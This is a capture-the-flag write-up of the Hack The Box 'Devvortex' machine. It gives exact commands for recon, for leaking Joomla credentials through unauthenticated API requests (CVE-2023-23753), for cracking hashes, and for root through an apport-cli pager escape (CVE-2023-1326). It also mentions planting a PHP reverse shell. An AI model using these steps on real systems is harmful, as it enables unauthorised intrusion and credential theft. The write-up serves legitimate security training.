---
title: Devvortex - HTB Writeup
date: 2024-04-27 10:03
categories: [ctf, linux, easy]
tags: [htb, linux, ctf, easy]    # TAG names should be lowercase
---
## Machine Info

Devvortex was an easy level Linux machine, involves exploiting CVE-2023-23753 for initial access and CVE-2023-1326 for Privilege Escalation

![Pasted image 20240427223821](https://github.com/iammR0OT/HTB/assets/74102381/0cf495ae-6c7f-46a6-a264-41bfeed1b106)

##  User
###  Scanning through Nmap

First of all we will go with nmap to scan the whole network and check for services running on the network. To scan the whole network and find all the open ports i use **-p-** used to scan the whole **65535** ports with **--min-rate 10000** to scan network faster from **nmap** and i found a list of open ports on the network and get only the open ports using different terminal tools like **cut**, **tr** etc. 

```shell
$ nmap -p- --min-rate 10000 10.129.229.146 -oN ini.txt && cat ini.txt | cut  -d ' ' -f1 | tr -d '/tcp' | tr '\n' ','
22,80
```

Now Let's run the depth scan on these specific ports using:

```bash
$ nmap -p22,80 -sC -sV -A -T4 10.129.229.146 -oN scan.txt
```

- **-sC** is to run all the default scripts
- **-sV** for service and version detection
- **-A** to check all default things
- **-T4** for aggressive scan
- **-oN** to write the result into a specified file

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

### Information Gathering

We have only two ports open, **80 HTTP** and **22 SSH**. From SSH version we can identify that Linux system is running on the target machine. On port 80 http, **nginx 1.18.0** is running, which is not vulnerable at the time of writing this writeup. Nmap also reveals that we are being redirected to `devvortex.htb` while accessing the website.
Let's add it to our local DNS file located at `/etc/hosts`, so that our browser can resolve it. 

```bash
$ echo "10.129.229.146  devvortex.htb" | sudo tee -a /etc/hosts
```

### Web Testing

There is a web development software house website that is running on port 80. They offer services in web development.

![Pasted image 20240427182944](https://github.com/iammR0OT/HTB/assets/74102381/d2d00b8d-ee19-4385-9ff7-466be591a22c)

#### Tech Stack

Server `nginx/1.18.0` is running on Ubuntu, nothing something special.

```http
HTTP/1.1 304 Not Modified
Server: nginx/1.18.0 (Ubuntu)
Last-Modified: Tue, 12 Sep 2023 17:45:54 GMT
Connection: close
ETag: "6500a3d2-4680"
```

I also tried to look for directories, but nothing special came out. After That i decided to look for subdomains, if i can find some. I use tool **ffuf**, you can also use different tools for this like, **wfuzz**, **gobuster** etc with the worlist `/seclists/Discovery/DNS/subdomains-top1million-110000.txt` from seclists. 

```bash
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u http://devvortex.htb/ -H "Host: FUZZ.devvortex.htb" -mc 200 -s
# Output
dev
```

- **-w** for wordlist
- **-u** for url
- **-H** for Host header
- **-mc** for match response code
- **-s** for silent mode, not to print banner and status

From ffuf, we discover a subdomain called **dev**. Lets add this also to our local DNS file called **hosts** located in `/etc` in Linux.

```bash
$ sudo sed -i 's/\devvortex.htb\b/dev.devvortex.htb &/' /etc/hosts
```

Same some kind of software company website is running.

![Pasted image 20240427191421](https://github.com/iammR0OT/HTB/assets/74102381/2f1d4b88-666e-42d7-8a06-a79a3de2f162)

Let's do some directory busting on this subdomain. We will using **ffuf** tool here because of it's robustness and fast response time. 

```bash
$ ffuf -u http://dev.devvortex.htb -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -mc 200,301 -s 
```

- **-u** for url
- **-w** for wordlist
- **-mc** to print only specified status code
- **-s** for silent mode, not to print banner

Ffuf found some directory paths for us. 

```
images
media
language
plugins
tmp
cache
includes
templates
modules
components
administrator
libraries
api
home
layouts
```

Administrator path looks interesting there. After checking the administrator path, we discover that there is a **joomla** login page is running.

![Pasted image 20240427192750](https://github.com/iammR0OT/HTB/assets/74102381/7d963be7-1e38-405f-bbde-d76fce072c74)

> Joomla is an open source Content Management System (CMS), which is used to build websites and online applications. It is free and extendable which is separated into front-end and back-end templates (administrator)


Let's fire a **joomscan** to find to joomla version to check if there is a vulnerable joomla running. Joomscan discover that, there is a `Joomla 4.2.6` running on the target server.

```bash
$ joomscan -u http://dev.devvortex.htb
```

![Pasted image 20240427193200](https://github.com/iammR0OT/HTB/assets/74102381/f6f626f8-5741-47a6-9b9c-0836b07e7508)

A quick google search reveals that the Joomla version 4.2.6 is vulnerable ot **CVE-2023-23753** Unauthenticated Information Disclosure.

![Pasted image 20240427193434](https://github.com/iammR0OT/HTB/assets/74102381/9351fe49-fa6a-4969-9292-8d795d605751)

A great article explaining the whole vulnerability and it's potential exploits can be found [here](https://vulncheck.com/blog/joomla-for-rce).
We will be using `curl -v http://dev.devvortex.htb/api/index.php/v1/users?public=true` to leak the usernames.

```
lewis@devvortex.htb
logan@devvortex.htb
```

![Pasted image 20240427194154](https://github.com/iammR0OT/HTB/assets/74102381/0b7ff3f8-05bb-4f66-a37c-745d7136bd3b)

To leak the database cred's, we will be using `curl -v http://10.9.49.205/api/index.php/v1/config/application?public=true`

```
lewis : P4ntherg0t1n5r3c0n##
```

![Pasted image 20240427194603](https://github.com/iammR0OT/HTB/assets/74102381/20337a13-39bb-4dfa-b628-b2892b3b82c0)

The database password is being used by **lewis** user who administrator on the CPanel. Let's add a php **reverseshell** on the administrator templates to gain initial foothold on the box

![Pasted image 20240427195500](https://github.com/iammR0OT/HTB/assets/74102381/6233c304-6051-49c4-96c5-ce8eb9899dc7)

After loading the **error.php** file we immediately get a shell on the box as a **www-data**.

![Pasted image 20240427195549](https://github.com/iammR0OT/HTB/assets/74102381/ce30abdd-180d-4ddd-ba94-59cc561e7350)

Through **/etc/passwd** file, we discover that, there is only two valid users on the box. And we don't have rights to see the content of either of these users'

```
logan
root
```

![Pasted image 20240427195839](https://github.com/iammR0OT/HTB/assets/74102381/a98c46af-14de-424e-a47b-3258ce00b3aa)

We discovered that the port 3306 (mysql) is running locally using 

```bash
$ ss -lntp
```

- **-l** for list the listening ports
- **-n** for numeric port number, not the service name
- **-t** to list the tcp ports
- **-p** to list the processes

![Pasted image 20240427200323](https://github.com/iammR0OT/HTB/assets/74102381/5705e6b9-726f-4c82-b46a-81e74f89232d)

Let's use the database (mysql) credentials we found using joomal CVE here to dump the database. Because the database port was not discovered

```
lewis : P4ntherg0t1n5r3c0n##
```

```bash
$ mysql -h localhost
```

![Pasted image 20240427215951](https://github.com/iammR0OT/HTB/assets/74102381/2b3dd30b-aef2-4c54-9ee7-1b21057faaec)

There are bunch of tables present in joomla database. The most interesting one is **sd4fg_users**. Let's dump it and see what's inside it.

![Pasted image 20240427220108](https://github.com/iammR0OT/HTB/assets/74102381/1e668957-fdfb-428b-82eb-cbea6d0c487c)

There is password hashes stored of both lewis and logan user. Let's save them in a file and crack them using hashcat.

```
lewis : $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u
logan : $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12
```

```bash
$ hashcat -m 3200 hash /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt

$2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12:tequieromucho
```

### Shell as Logan

Now we have both username and password. Lets gain a shell using SSH on the target system

```bash
$ sshpass -p tequieromucho  logan@devvortex.htb
```

![Pasted image 20240427220600](https://github.com/iammR0OT/HTB/assets/74102381/09abd458-d6bd-4e23-846c-316c016cf469)

## Privilege Escalation

Using `sudo -l` we found that the user logan can run apport-cli on the behalf of root user on the box.  The version of **apport-cli** is **2.20.11**

![Pasted image 20240427220832](https://github.com/iammR0OT/HTB/assets/74102381/e50475f0-bc87-44aa-803a-ee37fe42bc7e)

A quick google search reveals the Local privilege Escalation in `apport-cli 2.20.11` **CVE-2023-1326** . [here](https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://github.com/diego-tella/CVE-2023-1326-PoC&ved=2ahUKEwiHtJz58OKFAxUCSvEDHbv4DO8QFnoECCYQAQ&usg=AOvVaw0iDVPIzIn3FpXEV82pzFjY)

![Pasted image 20240427221158](https://github.com/iammR0OT/HTB/assets/74102381/871a084e-58b9-437a-924d-4a0a9b6c3c6e)

According to the PoC, If a system is specially configured to allow unprivileged users to run sudo apport-cli, less is configured as the pager, and the terminal size can be set: a local attacker can escalate privilege

### Exploitation

Let's first create a crash file and the give it's path and select **v** to make our exploit work. 

```bash
$ sleep 60 &
$ kill -SIGSEGV  2717
$ sudo apport-cli -c /var/crash/_usr_bin_sleep.1000.crash
```

![Pasted image 20240427223243](https://github.com/iammR0OT/HTB/assets/74102381/4ce99202-f7af-47ed-b44a-0eff5270293c)

After when you see the screen like below image press **!** and then enter. You will get a shell as a root on the box.

![Pasted image 20240427223521](https://github.com/iammR0OT/HTB/assets/74102381/02c7d6ec-b858-47fc-8dc8-d83f579b2c42)

![Pasted image 20240427223547](https://github.com/iammR0OT/HTB/assets/74102381/a556f091-db9b-4638-b615-a96b4f06077c)

# Happy Hacking ❤
